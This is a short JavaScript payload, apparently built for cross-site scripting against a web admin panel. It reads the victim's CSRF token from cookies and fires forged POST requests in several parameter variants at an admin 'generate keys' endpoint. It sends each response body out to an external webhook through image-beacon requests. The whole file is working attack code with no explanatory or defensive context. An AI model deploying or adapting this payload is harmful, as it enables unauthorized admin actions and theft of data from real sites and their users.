(async()=>{
  const ID = "d81b8f9f-eaed-4335-b554-2fc936a2fbe8";
  const W  = "https://webhooktest.net/webhook/01a12c84-d1c2-7258-acfc-88970615c34a";
  const C  = (document.cookie.match(/csrftoken=([^;]+)/)||[])[1] || "";
  const EP = "/admin-panel/claves/generar";
  const FH = { "Content-Type":"application/x-www-form-urlencoded", "X-CSRFToken": C };
  const JH = { "Content-Type":"application/json", "X-CSRFToken": C };
  function ex(q){ try{ new Image().src = W + "?" + q; }catch(e){} }
  const tries = [
    ["form_juego_id", EP, {method:"POST",headers:FH,body:"juego_id="+ID}],
    ["form_id",       EP, {method:"POST",headers:FH,body:"id="+ID}],
    ["form_juego",    EP, {method:"POST",headers:FH,body:"juego="+ID}],
    ["form_game_id",  EP, {method:"POST",headers:FH,body:"game_id="+ID}],
    ["qs_juego_id",   EP+"?juego_id="+ID, {method:"POST",headers:{"X-CSRFToken":C}}],
    ["json_juego_id", EP, {method:"POST",headers:JH,body:JSON.stringify({juego_id:ID})}],
  ];
  for (const [label,url,opt] of tries){
    try{
      const r = await fetch(url, opt);
      const t = await r.text();
      ex("t="+label+"&s="+r.status+"&d="+encodeURIComponent(t));
    }catch(e){ ex("t="+label+"&err="+encodeURIComponent(e.message)); }
  }
})();
